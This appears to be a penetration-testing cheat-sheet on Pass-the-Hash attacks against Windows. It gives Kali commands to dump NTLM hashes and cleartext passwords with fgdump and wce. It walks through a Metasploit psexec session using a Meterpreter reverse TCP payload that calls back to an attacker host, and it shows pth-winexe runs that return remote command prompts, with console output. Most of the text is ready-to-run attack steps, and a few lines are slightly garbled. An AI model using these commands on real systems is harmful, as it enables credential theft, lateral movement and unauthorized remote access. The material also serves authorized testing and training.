## Passing the hash with impacket

- https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/
- https://www.coresecurity.com/corelabs-research-special/open-source-tools/pass-hash-toolkit
- https://www.kali.org/penetration-testing/passing-hash-remote-desktop/

Cracking password hashes can be very time-consuming and it is often not feasible.
A different approach of making use of dumped hashes without cracking them has been around since 1997.
The technique, known as `Pass-The-Hash` (PTH), allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.
This is possible because NTLM/LM password hashes are not salted and remain static between sessions and computers whose combination of username and password is the same.

A list of tools included in Kali Linux to abuse LM/NTLM hashes:

- `pth-net` - executes net commands (net user, net share) on remote hosts
- `pth-rpcclient` - opens an interactive session to execute RPC commands
- `pth-smbclient` - browses available shares on remote computers
- `pth-winexe` - executes interactively a command on remote computers
- `pth-wmic` - executes WMI queries on remote computers
- `pth-wmis` - executes a command using WMI on remote computers


Dump password hashes:

```bash
fgdump.exe
```


Dump NTLM logon hashes:

```bash
wce32.exe -l
```

Dump cleartext password from digest auth package:

```bash
wce32.exe -w
wce does not run on Windows 2000
```


If NTLM is only available  (for example its a 15+ character password or through GPO they specify  NTLM response only), simply replace the ****NOPASSWORD**** with 32 0â€™s  for example:

```text
******NOPASSWORD*******:8846f7eaee8fb117ad06bdd830b7586c
```

Would be replaced by:

```text
00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c
```

Connect to a different victim using PSExec and just the hash values.

```bash
root@kali:~# msfconsole
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set LHOST 192.168.57.133
msf exploit(psexec) > set LPORT 443
msf exploit(psexec) > set RHOST 192.168.57.131
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit
meterpreter > shell
Process 3680 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>
```

We begin by first setting an environment variable called SMBHASH, containing the password hash we would like to use for authentication:

```bash
root@kali:~# export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
```

We can then use the pth-winexe tool to authenticate using the password hash and gain a remote command prompt on the target machine:

```bash
root@kali:~# pth-winexe -U administrator% //10.11.01.76 cmd
Password for [WORKGROUP\administrator]:
HASH PASS: Substituting user supplied NTLM HASH...
HASH PASS: Substituting user supplied NTLM HASH...
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.
All rights reserved.dw
C:\Windows\system32>
```

```bash
export SMBHASH=96fe1fc02d73a84c463db170b09126f1:be6ec26d0d71a533e14b65ce755d7bce
pth-winexe -U IUSR_SRV2 //10.xx.xx.31 cmd
```

When password is prompted, enter any value, only then SMBHASH value is considered, else authentication will.
SMBMAP can also be used for passing the hash.

```bash
export SMBHASH=6458e959995a134d79c59b51a1b6bf39
pth-winexe -U administrator% //10.10.10.10 ipconfig
```
